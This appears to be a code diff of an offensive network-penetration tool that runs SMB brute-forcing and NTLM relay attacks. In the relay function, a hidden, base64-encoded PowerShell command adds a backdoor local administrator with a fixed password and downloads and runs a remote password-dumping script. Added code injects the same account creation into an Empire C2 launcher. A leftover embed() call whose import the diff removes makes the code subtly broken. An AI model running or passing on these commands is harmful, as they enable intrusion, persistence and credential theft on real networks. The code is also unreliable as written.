@@ -4,6 +4,7 @@ import re
 import os
 import sys
 import time
+import base64
 import string
 import signal
 import random
@@ -20,10 +21,7 @@ from netaddr import IPNetwork, AddrFormatError
 from libnmap.parser import NmapParser, NmapParserException
 from subprocess import Popen, PIPE, check_output, CalledProcessError
 
-# debug
-#from IPython import embed
-
-# The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
+# Disable the InsecureRequests warning and the 'Starting new HTTPS connection' log message
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
@@ -516,7 +514,7 @@ def smb_reverse_brute(loop, hosts, args, passwords, prev_creds, prev_users):
     null_sess_hosts.update(chunk_null_sess_hosts)
     if len(null_sess_hosts) == 0:
         print('[-] No null SMB sessions available')
-        return
+        return None, None, None
     else:
         null_hosts = []
         for ip in null_sess_hosts:
@@ -755,7 +753,7 @@ def run_relay_attack(iface, args):
     if args.command:
         remote_cmd = args.command
     elif args.auto:
-        remote_cmd = get_empire_launcher_cmd(iface)
+        remote_cmd = run_empire(iface)
     else:
         # net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds
         remote_cmd = 'powershell -nop -exec bypass -w hidden -enc bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA=='
@@ -1068,36 +1066,60 @@ def check_for_nse_scripts(hosts):
         return True
 
 def run_proc_xterm(cmd):
+    '''
+    Runs a process in an xterm window
+    '''
     xterm_cmd = 'xterm -hold -e {}'
     full_cmd = xterm_cmd.format(cmd)
-    print(full_cmd)
     print('[*] Running: {}'.format(full_cmd))
     # Split it only on xterm args, leave system command in 1 string
     cmd_split = full_cmd.split(' ',3)
     proc = Popen(cmd_split, stdout=PIPE, stderr=PIPE)
+
     return proc
 
 def get_token(base_url):
+    '''
+    Get empire API token for further API calls
+    '''
     login_opts = {'username':'icebreaker', 'password':'P@ssword123456'}
     r = requests.post(base_url + '/api/admin/login', json=login_opts, verify=False) 
     if r.status_code == 200:
-        print(r.json())
         resp_json = r.json()['token']
         return resp_json
+
     print(r.json())
     raise
 
 def get_launcher_cmd(base_url, token):
+    '''
+    Gets the DeathStar listener launcher cmd
+    Also adds icebreaker user prior to running Empire launcher cmd
+    '''
     stager_opts = {'StagerName':'multi/launcher', 'Listener':'DeathStar'}
     r = requests.post(base_url + '/api/stagers?token={}'.format(token), json=stager_opts, verify=False) 
+
     if r.status_code == 200:
         # resp = {'multi/launcher':{'Output':'powershell.exe -NoP...'}
         launcher_cmd = r.json()['multi/launcher']['Output']
-        return launcher_cmd
+        split_launcher_cmd = launcher_cmd.split()
+        ps_args = ' '.join(split_launcher_cmd[:-1]) + ' '
+        ps_b64 = split_launcher_cmd[-1]
+        decoded_ps_b64 = base64.b64decode(ps_b64).decode('ascii').replace('\0','')
+        add_user_cmd = 'net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add;'
+        decoded_ps_cmd = add_user_cmd + decoded_ps_b64
+        embed()
+        remote_cmd = ps_args + base64.b64encode(decoded_ps_cmd.encode('UTF-16LE')).decode('utf-8')
+
+        return remote_cmd
+
     print(r.json())
     raise
 
-def get_empire_launcher_cmd(iface):
+def run_empire(iface):
+    '''
+    Gets the empire launcher command to run on the remote machine
+    '''
     base_url = 'https://0.0.0.0:1337'
     user = 'icebreaker'
     passwd = 'P@ssword123456'
@@ -1237,7 +1259,3 @@ if __name__ == "__main__":
         exit('[-] Run as root')
     report = parse_nmap(args)
     main(report, args)
-
-# Future
-# -c option to specify what ntlmrelay runs
-# xterm windows with empire and deathstar? might be too specific to gui interfaces but would be neat option
